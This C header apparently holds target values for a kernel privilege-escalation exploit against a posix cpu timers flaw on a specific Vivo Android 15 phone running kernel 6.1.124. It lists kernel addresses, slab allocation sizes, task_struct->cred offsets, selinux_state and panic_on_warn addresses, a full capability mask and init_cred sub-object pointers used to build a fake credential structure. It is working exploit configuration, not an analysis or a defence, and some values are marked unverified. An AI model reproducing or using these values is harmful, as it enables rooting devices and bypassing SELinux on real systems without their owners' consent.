/*
 * CVE-2026-98260 - posix cpu timers: 6.1.124 backport target values (DRAFT)
 * Kernel: 6.1.124-android14-11-maybe-dirty (Vivo V2352A / PD2352, Android 15)
 * Device: vivo/PD2352 (ro.product.device=PD2352), OriginOS 5, slot _b
 * Image: boot_b.img dump (slot _b) SHA256 eff9a145766e2cc8292e86f3b2c75d4679503f75a9c909597b102883fbb35227 | vmlinux.btf 5804671 B
 *
 * Derivation method per value (see ROM_OS5 + v2352a-6.1.124 evidence):
 *  [BTF]    = vmlinux-6.1.124.btf (bpftool raw dump)
 *  [LIVE]   = timer ids diag on the 6.1.124 device (log.txt 20261105-121213)
 *  [DISASM] = Image disasm (capstone) confirmation
 *  [GCONF]  = ToolsV1 offsets-6.1.124 config, method validated byte-exact on 6.1.145
 *  [DECODE] = init_cred bytes decoded from Image (link-time pointers)
 *  [STRSCAN]= rodata string -> data-word reference scan
 *
 * UNVERIFIED: VR_TAG_A/B + vr.ko kill path (Android 15 vr.ko not yet obtained).
 * DO NOT BUILD/RUN with unverified vr values.
 */

#ifndef TARGET_H
#define TARGET_H

/* do_timer_create bl kmem_cache_alloc [DISASM: adrp x20 + ldr x0,[x20,#0xea0]
 * (cache @0xa404ea0) + mov w1,#0xdc0 + bl; matches 6.1.145 pattern].
 * Live diag: 16 identical samples req=alloc=0x108 [LIVE]. */
#define STATIC_TIMER_SITE   0xffffffc0081a14d0ULL
#define TIMER_SITE_LOW21    0x1a14d0ULL
#define TIMER_ALLOC         0x108ULL

/* cred struct 176 (0xB0) [BTF]; slab cred_jar 192 + live diag
 * req=0xb8 alloc=0xc0 cnt=3 [LIVE], same as 6.1.145. */
#define CRED_REQ            0xb8ULL
#define CRED_ALLOC          0xc0ULL

/* GhostLock file offset 38883920 + base [GCONF, validated on 6.1.145]. */
#define SELINUX_STATE_STATIC  0xffffffc00a515250ULL
#define PANIC_ON_WARN_STATIC  0xffffffc00a18ae08ULL /* [STRSCAN: ctl_table shape] */
#define CRED_UID_OFF          0x4ULL                /* [BTF] */

/* task_struct / cred layout [BTF] */
#define OFF_TASK_CRED       0x838ULL
/* dup_task_struct+0x58 ret (bl at +0x54, alloc_node w/ task_struct_cachep)
 * [DISASM: adrp x25 + ldr x0,[x25,#0x638] (@0xa3dc638) + mov w1,#0xcc0 + mov w2 (node)].
 * Live diag single sample req=alloc=0x1500 [LIVE]. */
#define COPY_PROCESS_LOW21  0xad6e8ULL
#define TASK_ALLOC_BYTES    0x1500ULL
#define FULLCAP             0x1ffffffffffULL

/* Link-time symbols for the fake cred's refcounted sub-objects [DECODE @init_cred] */
#define ROOT_USER_STATIC    0xffffffc00a1b1148ULL
#define INIT_USER_NS_STATIC 0xffffffc00a1b0eb0ULL
#define INIT_UCOUNTS_STATIC 0xffffffc00a1b29f8ULL
#define INIT_GROUPS_STATIC  0xffffffc00a1b2468ULL
#define SELINUX_BLOB_OFF    0x0ULL
#define SELINUX_SID_KERNEL  1U

/* thread_info 48B [BTF]: flags@0, scs_sp@32, cpu@40, pad@44.
 * Writes task+0x00 (8B) and task+0x28 (8B) stay inside 0x00-0x2f, __state@0x30 safe.
 * Tag byte values (0x06/0x2c) + kill path UNVERIFIED without Android 15 vr.ko. */
#define VR_TAG_A_OFF        0x06ULL
#define VR_TAG_B_OFF        0x2cULL

/* __tracepoint_sys_exit [STRSCAN: name match + 72B struct shape, funcs NULL].
 * TRACEPOINT_FUNCS_OFF [BTF]. */
#define TP_SYS_EXIT_STATIC   0xffffffc00a3892c0ULL
#define TRACEPOINT_FUNCS_OFF 0x40ULL

#endif /* TARGET_H */
